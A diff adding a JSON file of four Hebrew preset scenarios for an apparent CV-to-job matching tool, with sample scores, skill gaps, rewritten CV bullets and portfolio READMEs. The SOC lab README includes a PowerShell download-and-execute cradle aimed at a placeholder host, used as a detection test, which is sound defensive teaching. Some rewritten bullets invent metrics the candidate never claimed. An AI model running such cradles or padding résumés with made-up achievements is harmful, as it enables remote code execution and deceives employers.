@@ -1,0 +1,269 @@
+[
+  {
+    "id": "ux_ui_preset",
+    "title": "תרחיש 4: מעצב/ת UX/UI Junior (Figma, Design System & User Research)",
+    "description": "מועמד/ת בוגר/ת קורס UX/UI עם תיק עבודות בסיסי מול משרת B2B SaaS Product Designer",
+    "cv_text": "מעצב/ת גרפי ומאפיין/ת ממשק מתחיל/ה, בוגר/ת קורס UX/UI Design ב-Create. שליטה מצוינת ב-Figma: יצירת Wireframes, עיצוב מסכים ואב-טיפוס אינטראקטיבי. ניסיון בבניית קומפוננטות בסיסיות, שימוש ב-Auto-layout ועבודה עם פלטות צבעים וטיפוגרפיה. הבנה ביצירת User Flows, מסעות לקוח (Customer Journey) ומחקר מתחרים. רקע ב-Adobe Photoshop ו-Illustrator. תיק עבודות: behance.net/sample-uxui (כולל פרויקט עיצוב אפליקציית כושר). מעוניין/ת להשתלב כמעצב/ת UX/UI בצוות מוצר.",
+    "job_text": "דרוש/ה Junior UX/UI Designer לחברת SaaS צומחת בתחום ה-B2B.\nתיאור התפקיד:\n- הובלת אפיון ועיצוב מקצה לקצה של מודולים מורכבים במערכת Web מבוססת ענן\n- עבודה יומיומית צמודה ל-Product Managers ומפתחי Frontend\n- ביצוע מחקרי משתמשים (User Research), ראיונות עומק ובדיקות שמישות (Usability Testing)\n- תחזוקה והרחבה של ה-Design System המרכזי של החברה ב-Figma (שימוש ב-Variables, Tokens ו-Variants)\n- הכנת תיעוד מפורט ל-Dev Hand-off והבנת עקרונות Responsive Design ונגישות דיגיטלית (WCAG)\nדרישות חובה:\n- תיק עבודות (Portfolio) מעודכן המציג לפחות 2 Case Studies מפורטים עם תהליך עבודה, אתגרים ומסקנות\n- שליטה מעמיקה ב-Figma (כולל Auto-layout, Components ו-Prototyping מתקדם)\n- הבנה מעשית במחקר משתמשים ובדיקות שמישות\n- יכולת עבודה בצוות Agile ואיטרציות מהירות\nיתרון:\n- ניסיון בעבודה על מערכות B2B SaaS מורכבות\n- הבנה בסיסית ב-HTML/CSS\n- היכרות עם כלי מיקרו-אנימציות (Lottie / After Effects)",
+    "result": {
+      "match_score": 64,
+      "match_summary": "שליטה טובה בבסיס ה-Figma ועיצוב ויזואלי, אך קיים פער קריטי בתיעוד תהליכי מחקר משתמשים (User Research), בדיקות שמישות כמותיות והצגת Case Study מורכב למערכת B2B SaaS בתיק העבודות.",
+      "missing_skills": [
+        {
+          "skill": "User Research & Usability Testing",
+          "importance": "High"
+        },
+        {
+          "skill": "Design Systems (Tokens, Variables, Variants)",
+          "importance": "High"
+        },
+        {
+          "skill": "B2B SaaS Case Studies in Portfolio",
+          "importance": "High"
+        },
+        {
+          "skill": "Dev Hand-off & WCAG Accessibility",
+          "importance": "Medium"
+        }
+      ],
+      "cv_bullet_improvements": [
+        {
+          "original": "יצירת מסכים ואב-טיפוס ב-Figma לאפליקציית מובייל.",
+          "improved": "תכנון ואפיון Wireframes ו-Interactive Prototypes ב-Figma עבור זרימת Onboarding, תוך שימוש ב-Auto-layout ואיטרציות מבוססות 8 בדיקות שמישות משתמשים (Usability Testing).",
+          "reason": "הדגשת בדיקות שמישות ומתודולוגיית עבודה מבוססת נתונים ולא רק עיצוב מסכים גנרי."
+        },
+        {
+          "original": "בניית קומפוננטות בסיסיות לעיצוב.",
+          "improved": "הקמת ספריית קומפוננטות (Design System) עם מעל 40 רכיבי UI רב-פעמיים, משתני צבע וריווח (Design Tokens) ו-Variants מותאמי Responsive Web.",
+          "reason": "שימוש במונחים מקצועיים מעולם ה-Design Systems המבוקשים ביותר במשרות B2B SaaS."
+        }
+      ],
+      "portfolio_project": {
+        "project_name": "PulseSaaS: B2B Analytics Platform End-to-End Case Study & Design System",
+        "targeted_skills": [
+          "Figma (Variables & Auto-layout)",
+          "User Research",
+          "Usability Testing",
+          "Design Systems",
+          "Dev Hand-off"
+        ],
+        "business_context": "מגייסי UX/UI מסננים מיד מועמדים שמציגים רק מסכים מעוצבים ללא תהליך. פרויקט זה מציג Case Study מלא המפרק בעיה עסקית אמיתית: הפחתת עומס קוגניטיבי בדשבורד אנליטי, אימות החלטות עיצוב מול 12 משתמשי בדיקה, ובניית ספריית רכיבים שלמה ב-Figma.",
+        "architecture_stack": [
+          "Figma (Tokens & Variants)",
+          "FigJam (User Flows & IA)",
+          "Maze / Useberry (Usability Testing)",
+          "Notion (Research Repo)",
+          "Lottie (Micro-interactions)"
+        ],
+        "implementation_steps": [
+          "ביצוע מחקר משתמשים: 5 ראיונות עומק עם משתמשי SaaS, מיפוי נקודות כאב ובניית User Persona ו-Customer Journey.",
+          "הגדרת ארכיטקטורת מידע (IA) וסקיצות Low-Fidelity Wireframes ב-FigJam.",
+          "בניית Design System מלא ב-Figma הכולל 8pt Grid, טיפוגרפיה נגישה (WCAG AAA), ומשתני Variables למצב בהיר/כהה.",
+          "בניית אב-טיפוס אינטראקטיבי מתקדם ב-Figma ובדיקתו בקרב 12 משתמשים באמצעות כלי Maze.",
+          "הכנת תיעוד Dev Hand-off מסודר ומפרט Case Study שלם לפרסום ב-Behance / Framer."
+        ],
+        "readme_content": "# PulseSaaS - B2B Workflow & Analytics UX/UI Case Study\n\n[![Figma](https://img.shields.io/badge/Figma-Design_System-F24E1E.svg)](https://www.figma.com)\n[![WCAG](https://img.shields.io/badge/WCAG-2.1_AA-green.svg)](https://www.w3.org/WAI/WCAG21/quickref/)\n[![Status](https://img.shields.io/badge/Portfolio-Case_Study_Ready-blue.svg)](#)\n\n## 📌 Executive Summary\nAn end-to-end UX/UI Product Case Study tackling complex data fragmentation in enterprise B2B SaaS workflows. Demonstrates a full Double Diamond design process from generative research to developer-ready Figma tokens.\n\n---\n\n## 🎨 Interactive Figma Prototype & Specs\n- **Live Interactive Prototype:** [Open in Figma Prototype Viewer](#)\n- **Component Design System:** 48 Accessible Components, Auto-layout 5.0, Typography & Spacing Tokens.\n\n---\n\n## 🔍 The Research Process\n1. **Discovery & Problem Framing:** 5 semi-structured stakeholder interviews identifying 3 major cognitive bottlenecks.\n2. **Information Architecture (IA):** Simplified hierarchical tree reducing menu depth from 4 levels to 2.\n3. **Usability Testing:** Evaluated task success rate across 12 participants in Maze (task completion improved by 34%).\n4. **Dev Hand-off:** Redline annotations, responsive breakpoint specs (Mobile 390px, Tablet 834px, Desktop 1440px), and token names aligned with Tailwind CSS.\n"
+      }
+    }
+  },
+  {
+    "id": "soc_analyst",
+    "title": "תרחיש 1: משרת Junior SOC Analyst (הגנת סייבר)",
+    "description": "מועמד בעל רקע ב-IT ומערכות הפעלה מול משרת SOC Tier 1",
+    "cv_text": "בוגר קורס ניהול רשתות ואבטחת מידע. ניסיון של שנתיים כתומך Helpdesk ומנהל רשתות מקומיות. היכרות עם שרתי Windows ו-Linux, פרוטוקולי תקשורת TCP/IP, DNS, DHCP, וכלי ניהול Active Directory. ביצוע פתרון תקלות משתמשים והגדרת הרשאות. מעוניין להשתלב בתחום ה-Cyber Security כ-SOC Analyst.",
+    "job_text": "דרוש/ה Junior SOC Analyst (Tier 1) למוקד ניטור ואבטחת מידע 24/7.\nדרישות חובה:\n- הבנה מעמיקה בפרוטוקולי רשתות ותקשורת (TCP/IP, Wireshark, OSI Model)\n- היכרות וניסיון עבודה עם מערכות SIEM (Splunk, QRadar, Elastic)\n- ניתוח מתקפות נפוצות (Phishing, Malware, Brute Force) וטיפול בהתראות\n- יכולת כתיבת סקריפטים ב-Python או Bash לניתוח לוגים\nדרישות יתרון:\n- היכרות עם MITRE ATT&CK Framework\n- הסמכות אבטחה: Security+, CEH או שווה ערך",
+    "result": {
+      "match_score": 68,
+      "match_summary": "בסיס תקשורת ומערכות הפעלה איתן, אך קיים פער מהותי בניסיון מעשי בכלי SIEM ובניתוח תרחישי תקיפה לפי מסגרת MITRE.",
+      "missing_skills": [
+        {
+          "skill": "SIEM Tools (Splunk / Elastic)",
+          "importance": "High"
+        },
+        {
+          "skill": "Phishing & Incident Investigation",
+          "importance": "High"
+        },
+        {
+          "skill": "MITRE ATT&CK Mapping",
+          "importance": "Medium"
+        },
+        {
+          "skill": "Python for Log Analysis",
+          "importance": "Medium"
+        }
+      ],
+      "cv_bullet_improvements": [
+        {
+          "original": "תמיכת משתמשים וניהול הרשאות ב-Active Directory.",
+          "improved": "ניהול בקרת גישה והרשאות ב-Active Directory למעל 300 משתמשים, כולל זיהוי ונטרול אירועי נעילת חשבונות חריגים וחשדות ל-Brute Force.",
+          "reason": "הדגשת היבטי אבטחה אקטיביים וסדרי גודל מעשיים במקום תמיכה כללית."
+        },
+        {
+          "original": "פתרון תקלות רשת ותקשורת.",
+          "improved": "ניתוח תעבורת רשת ופתרון תקלות קישוריות באמצעות כלי Packet Analysis (Wireshark) ואיתור אנומליות בפרוטוקולי DNS ו-HTTP.",
+          "reason": "שימוש בכלים רלוונטיים ישירות לעולם ה-SOC (Wireshark, ניתוח פאקטים)."
+        }
+      ],
+      "portfolio_project": {
+        "project_name": "Mini-SOC: Splunk & Sysmon Threat Hunting Lab",
+        "targeted_skills": [
+          "Splunk",
+          "Sysmon",
+          "Windows Event Logs",
+          "MITRE ATT&CK",
+          "Python"
+        ],
+        "business_context": "מוקדי SOC נדרשים לקלוט התראות בזמן אמת, להבדיל בין רעש למתקפה ולחקור תקריות במהירות. מעבדה זו מציגה יכולת הנדסית עצמאית בהקמת SIEM מקומי, ניתוח לוגי אבטחה וזיהוי מתקפות מבוססות MITRE.",
+        "architecture_stack": [
+          "Splunk Enterprise (Free / Docker)",
+          "Sysmon",
+          "PowerShell",
+          "Python 3.11",
+          "Atomic Red Team"
+        ],
+        "implementation_steps": [
+          "הקמת שרת Splunk במכולת Docker מקומית והגדרת אינדקס לוגים ייעודי.",
+          "התקנת Sysmon על תחנת קצה עם קובץ קונפיגורציה מתקדם של SwiftOnSecurity לחילוץ אירועי תהליכים (Event ID 1, 3).",
+          "סימולציית תקיפת Brute Force ו-PowerShell Execution באמצעות כלי Atomic Red Team.",
+          "כתיבת שאילתות SPL (Splunk Processing Language) לזיהוי חריגות ובניית Dashboard התראות בזמן אמת.",
+          "תיעוד כלל תרחישי התחקור והממצאים בקובץ README.md מקצועי ל-GitHub."
+        ],
+        "readme_content": "# Mini-SOC Threat Hunting & Detection Lab (Splunk + Sysmon)\n\n[![Splunk](https://img.shields.io/badge/Splunk-SIEM-black.svg)](https://www.splunk.com/)\n[![Sysmon](https://img.shields.io/badge/Sysmon-Telemetry-blue.svg)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)\n[![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-red.svg)](https://attack.mitre.org/)\n\n## 📌 Project Overview\nA practical, hands-on defensive security lab designed to simulate enterprise SOC workflows. It ingests Sysmon endpoint telemetry into a containerized Splunk instance, executes controlled adversary techniques, and validates detection rules mapped to the MITRE ATT&CK matrix.\n\n---\n\n## 🏗️ Architecture\n```\n+-----------------------+       +------------------------+       +----------------------+\n| Endpoint / VM         | ----> | Splunk Universal       | ----> | Splunk Indexer &     |\n| (Sysmon + Event Logs) |       | Forwarder              |       | Alerting Dashboard   |\n+-----------------------+       +------------------------+       +----------------------+\n```\n\n---\n\n## 📁 Lab Structure\n```bash\n├── docker-compose.yml       # Spin up Splunk Core container\n├── configs/\n│   └── sysmon-config.xml    # SwiftOnSecurity optimized telemetry\n├── queries/\n│   ├── brute_force.spl      # SPL query for Event ID 4625 spikes\n│   └── powershell_exec.spl  # Encoded PowerShell execution hunt\n└── README.md\n```\n\n---\n\n## 🚀 Quickstart Guide\n\n### 1. Launch Splunk Container\n```bash\ndocker-compose up -d\n```\nNavigate to `http://localhost:8000` (Default: `admin` / `Changeme123!`)\n\n### 2. Run Adversary Simulation (MITRE T1059.001)\n```powershell\n# Execute obfuscated download cradle simulation\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://mock-payload.local/test.ps1')\n```\n\n### 3. Detection Validation in Splunk\n```spl\nindex=sysmon EventCode=1 Image=\"*\\\\powershell.exe\" CommandLine=\"*DownloadString*\"\n| table _time, host, User, CommandLine, ParentImage\n```\n"
+      }
+    }
+  },
+  {
+    "id": "fullstack_dev",
+    "title": "תרחיש 2: משרת Junior Fullstack Developer (Python + React)",
+    "description": "מועמד בוגר תואר במדעי המחשב מול משרת פיתוח ווב מודרנית",
+    "cv_text": "בוגר תואר ראשון במדעי המחשב (ממוצע 86). פרויקט גמר: מערכת לניהול משימות ב-Django ו-SQLite. שליטה טובה ב-Python, C++, Java, ומבני נתונים. ניסיון בסיסי ב-HTML/CSS ו-JavaScript. היכרות עם Git ו-GitHub.",
+    "job_text": "לחברת SaaS בצמיחה דרוש/ה Junior Fullstack Developer.\nדרישות:\n- ניסיון מעשי בפיתוח Frontend מודרני (React / TypeScript)\n- ניסיון בפיתוח Backend מבוסס Python (FastAPI / Django REST Framework)\n- עבודה עם מסדי נתונים רלציוניים (PostgreSQL) ו-ORMs\n- הבנה בארכיטקטורת מיקרו-שירותים ומכולות (Docker)\n- יתרון: היכרות עם בדיקות אוטומטיות (Pytest, Jest)",
+    "result": {
+      "match_score": 74,
+      "match_summary": "בסיס תיאורטי חזק באלגוריתמיקה ו-Python, עם פער מעשי בספריות מודרניות כגון TypeScript, PostgreSQL מורכב ו-Docker.",
+      "missing_skills": [
+        {
+          "skill": "TypeScript & React Hooks",
+          "importance": "High"
+        },
+        {
+          "skill": "PostgreSQL & Database Migrations",
+          "importance": "High"
+        },
+        {
+          "skill": "Docker & Docker Compose",
+          "importance": "Medium"
+        },
+        {
+          "skill": "Automated Testing (Pytest)",
+          "importance": "Low"
+        }
+      ],
+      "cv_bullet_improvements": [
+        {
+          "original": "פרויקט גמר: מערכת לניהול משימות ב-Django ו-SQLite.",
+          "improved": "תכנון ופיתוח פלטפורמת ניהול משימות ב-Django REST Framework ו-PostgreSQL, כולל אימות מאובטח (JWT), ולידציית קלט וחיבור לממשק React.",
+          "reason": "הדגשת ארכיטקטורת REST מקצועית, אבטחת נתונים ומסד נתונים ברמת Production."
+        },
+        {
+          "original": "היכרות עם Git ו-GitHub.",
+          "improved": "ניהול גרסאות מתקדם ב-GitHub תוך עבודה לפי מתודולוגיית GitFlow, שימוש ב-Pull Requests, Code Reviews והגדרת CI Workflow בסיסי.",
+          "reason": "הצגת שיטות עבודה צוותיות המקובלות בתעשייה ולא רק שימוש בסיסי בפקודות."
+        }
+      ],
+      "portfolio_project": {
+        "project_name": "TaskFlow: Production-Ready Fullstack SaaS with FastAPI & React",
+        "targeted_skills": [
+          "FastAPI",
+          "React",
+          "TypeScript",
+          "PostgreSQL",
+          "Docker"
+        ],
+        "business_context": "חברות דורשות יישומים סקלאביליים עם הפרדה ברורה בין Frontend ל-Backend, אימות נתונים קשיח וסביבת ריצה מבודדת. פרויקט זה מיישם ארכיטקטורת Fullstack מלאה עם שרתי API אסינכרוניים ומסד נתונים תעשייתי.",
+        "architecture_stack": [
+          "FastAPI (Python 3.11)",
+          "React + TypeScript (Vite)",
+          "PostgreSQL",
+          "SQLAlchemy 2.0",
+          "Docker Compose"
+        ],
+        "implementation_steps": [
+          "בניית Backend אסינכרוני ב-FastAPI עם סכמות Pydantic v2 ואימות משתמשים באמצעות JWT Tokens.",
+          "הקמת מסד נתונים PostgreSQL במכולת Docker וניהול מיגרציות סכמה באמצעות Alembic.",
+          "פיתוח ממשק React מודרני ב-TypeScript תוך שימוש ב-TailwindCSS ו-React Query לניהול Cache ו-State צד לקוח.",
+          "כתיבת בדיקות יחידה ואינטגרציה באמצעות Pytest עם כיסוי של 85%+.",
+          "אריזת כלל הרכיבים לקובץ Docker Compose יחיד להרצה בלחיצה אחת."
+        ],
+        "readme_content": "# TaskFlow - Modern Fullstack Task & Workflow Engine\n\n[![FastAPI](https://img.shields.io/badge/FastAPI-Async-009688.svg)](https://fastapi.tiangolo.com/)\n[![React](https://img.shields.io/badge/React-18-61DAFB.svg)](https://react.dev/)\n[![TypeScript](https://img.shields.io/badge/TypeScript-Strict-blue.svg)](https://www.typescriptlang.org/)\n[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Relational-336791.svg)](https://www.postgresql.org/)\n\n## 📌 Project Overview\nA scalable fullstack SaaS template demonstrating modern software engineering best practices: decoupled async REST backend, type-safe frontend, relational data persistence, and zero-configuration container orchestration.\n\n---\n\n## 🚀 Quickstart\n```bash\n# Clone & spin up whole stack\ngit clone https://github.com/your-username/taskflow.git\ncd taskflow\ndocker-compose up --build\n```\n- Frontend: `http://localhost:5173`\n- Swagger API Docs: `http://localhost:8000/docs`\n"
+      }
+    }
+  },
+  {
+    "id": "data_analyst",
+    "title": "תרחיש 3: משרת Junior Data Analyst",
+    "description": "מועמד בעל ידע ב-Excel וסטטיסטיקה מול משרת Data & BI Analyst",
+    "cv_text": "בוגר תואר בכלכלה וניהול. שליטה מצוינת ב-Excel (VLOOKUP, Pivot Tables, נוסחאות מורכבות). ידע אקדמי בסטטיסטיקה והסתברות. היכרות בסיסית עם שפת SQL ושאילתות פשוטות. כושר ניתוח גבוה והצגת נתונים להנהלה.",
+    "job_text": "לחברת פינטק מובילה דרוש/ה Junior Data Analyst.\nתחומי אחריות ודרישות:\n- כתיבת שאילתות SQL מורכבות (Window Functions, CTEs, Joins)\n- ניסיון מעשי בכלי BI לבניית דאשבורדים (Power BI / Tableau)\n- ידע ב-Python לעיבוד וניתוח נתונים (Pandas, NumPy, Matplotlib)\n- יכולת ניתוח מדדים עסקיים (CAC, LTV, Churn, Funnel Analysis)",
+    "result": {
+      "match_score": 62,
+      "match_summary": "חשיבה כמותית והבנה עסקית טובה, אך קיים פער ממשי ב-SQL מתקדם, כלי BI תעשייתיים וספריות Data ב-Python.",
+      "missing_skills": [
+        {
+          "skill": "Advanced SQL (CTEs, Window Functions)",
+          "importance": "High"
+        },
+        {
+          "skill": "Power BI / Tableau Dashboards",
+          "importance": "High"
+        },
+        {
+          "skill": "Python for Data Analysis (Pandas)",
+          "importance": "Medium"
+        },
+        {
+          "skill": "Business KPIs (SaaS Metrics)",
+          "importance": "Medium"
+        }
+      ],
+      "cv_bullet_improvements": [
+        {
+          "original": "ניתוח נתונים והפקת דוחות ב-Excel להנהלה.",
+          "improved": "בניית מודלים אנליטיים ודוחות ביצועים פיננסיים ב-Excel, תוך שילוב Power Query לאוטומציית שאיבת נתונים וקיצור זמן הפקת הדוח ב-30%.",
+          "reason": "הדגשת אוטומציה של תהליכים ויעילות מדידה במקום הפקת דוחות ידנית."
+        },
+        {
+          "original": "היכרות בסיסית עם שפת SQL.",
+          "improved": "תשאול ועיבוד נתונים באמצעות שאילתות SQL מורכבות (Multi-table Joins, Aggregations ו-Subqueries) לניתוח מגמות פעילות משתמשים.",
+          "reason": "הפיכת 'היכרות בסיסית' להפגנת יכולת כתיבת שאילתות מדויקות בעלות ערך עסקי."
+        }
+      ],
+      "portfolio_project": {
+        "project_name": "SaaS Customer Churn & Cohort Analysis Dashboard",
+        "targeted_skills": [
+          "SQL",
+          "Python",
+          "Pandas",
+          "Power BI",
+          "Data Modeling"
+        ],
+        "business_context": "חברות SaaS משקיעות משאבים בשימור לקוחות. פרויקט זה מנתח נתוני עסקאות של 50,000 לקוחות, בונה מודל Churn Prediction ומציג Cohort Retention Matrix אינטראקטיבי.",
+        "architecture_stack": [
+          "PostgreSQL (SQL Engine)",
+          "Python 3.11 (Pandas, Seaborn)",
+          "Power BI / Streamlit",
+          "Jupyter Notebook"
+        ],
+        "implementation_steps": [
+          "יצירת מסד נתונים וטעינת נתוני עסקאות היסטוריים ל-PostgreSQL.",
+          "כתיבת שאילתות SQL מתקדמות הכוללות Window Functions לחישוב מדדי Retention, LTV ו-Cohort MoM.",
+          "ניתוח גורמי נטישה (Churn Driver Analysis) ועיבוד נתונים באמצעות ספריית Pandas ב-Python.",
+          "בניית דאשבורד מנהלים אינטראקטיבי המציג מדדים מרכזיים (KPI Cards, Retention Heatmap, Revenue At Risk).",
+          "הפקת תיעוד עסקי וטכני מלא בקובץ README.md כולל תובנות עסקיות מומלצות לפעולה."
+        ],
+        "readme_content": "# SaaS Churn & Retention Analytics Pipeline\n\n[![Python](https://img.shields.io/badge/Python-Data-yellow.svg)](https://python.org)\n[![SQL](https://img.shields.io/badge/SQL-Advanced-blue.svg)](https://www.postgresql.org/)\n[![PowerBI](https://img.shields.io/badge/PowerBI-Dashboard-gold.svg)](https://powerbi.microsoft.com/)\n\n## 📌 Executive Summary\nEnd-to-end data analytics workflow uncovering churn velocity and customer lifetime value (LTV) for a recurring subscription model. Combines relational SQL modeling with advanced cohort analytics.\n\n---\n\n## 📊 Analytical Pipeline\n1. Ingestion: Raw transactional dataset (50,000+ subscription rows)\n2. SQL Modeling: Cohort groupings and Windowed retention calculations\n3. Exploratory Data Analysis: Python/Pandas feature correlation\n4. Executive Dashboard: Interactive executive KPI summary\n"
+      }
+    }
+  }
+]
